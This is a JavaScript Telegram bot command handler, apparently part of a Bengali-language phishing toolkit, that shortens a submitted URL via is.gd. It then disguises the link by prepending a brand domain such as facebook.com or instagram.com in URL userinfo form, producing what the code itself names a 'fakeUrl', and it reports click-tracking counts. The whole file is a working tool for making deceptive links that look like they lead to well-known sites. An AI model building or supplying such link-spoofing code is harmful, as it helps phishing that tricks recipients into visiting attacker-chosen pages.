const authMiddleware = require('../middlewares/auth');
const rateLimiter = require('../middlewares/rateLimiter');
const isgd = require('isgd');
const helpers = require('../utils/helpers');

const siteCodes = {
  fb: 'facebook.com',
  yt: 'youtube.com',
  ig: 'instagram.com',
  tw: 'twitter.com',
  wa: 'whatsapp.com',
  tg: 'telegram.org',
  ck: 'tiktok.com',
  pt: 'pinterest.com',
  rd: 'reddit.com',
  li: 'linkedin.com'
};

module.exports = async (bot, msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const text = msg.text;
  
  try {
    const auth = await authMiddleware(msg);
    if (!auth.allowed) {
      return bot.sendMessage(chatId, 'অ্যাক্সেস দেওয়া হয়নি। আগে /start দিন এবং অনুমোদনের জন্য অপেক্ষা করুন।');
    }
    
    const rateLimit = rateLimiter(userId);
    if (!rateLimit.allowed) {
      return bot.sendMessage(chatId, 'অনেক বেশি অনুরোধ পাঠানো হয়েছে। এক মিনিট পরে আবার চেষ্টা করুন।');
    }
    
    // কমান্ড পার্স
    const parts = text.split(' ');
    if (parts.length < 3) {
      let siteList = Object.entries(siteCodes)
        .map(([code, name]) => `• ${code} → ${name}`)
        .join('\n');
      
      return bot.sendMessage(chatId,
        `🔄 𝐒𝐇𝐎𝐑𝐓𝐄𝐍 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 𝐅𝐎𝐑𝐌𝐀𝐓\n\n` +
        `📌 ফরম্যাট: /shorten [site_code] [url]\n\n` +
        `🎯 সাইট কোডসমূহ:\n${siteList}\n\n` +
        `📝 উদাহরণ:\n` +
        `/shorten fb https://example.com\n` +
        `→ https://facebook.com-1@is.gd/abc123`
      );
    }
    
    const siteCode = parts[1].toLowerCase();
    const url = parts[2];
    
    if (!siteCodes[siteCode]) {
      return bot.sendMessage(chatId, '❌ ভুল সাইট কোড।');
    }
    
    // is.gd দিয়ে শর্টেন
    isgd.shorten(url, async (shortUrl) => {
      if (!shortUrl) {
        return bot.sendMessage(chatId, '❌ URL শর্টেন করতে সমস্যা হয়েছে।');
      }
      
      // প্রিফিক্স যুক্ত করা
      const domain = siteCodes[siteCode];
      const fakeUrl = `https://${domain}-1@${shortUrl}`;
      
      await bot.sendMessage(chatId,
        `✅ 𝐔𝐑𝐋 𝐒𝐇𝐎𝐑𝐓𝐄𝐍𝐄𝐃\n\n` +
        `🔗 শর্ট লিঙ্ক:\n${fakeUrl}\n\n` +
        `📊 ট্র্যাকিং:\n` +
        `• টোটাল ক্লিক: ০\n` +
        `• ইউনিক ভিজিটর: ০\n` +
        `• ক্লিক টাইমলাইন: N/A`
      );
    });
    
  } catch (error) {
    console.error('Shorten Command Error:', error);
    await bot.sendMessage(chatId, '❌ এরর হয়েছে।');
  }
};
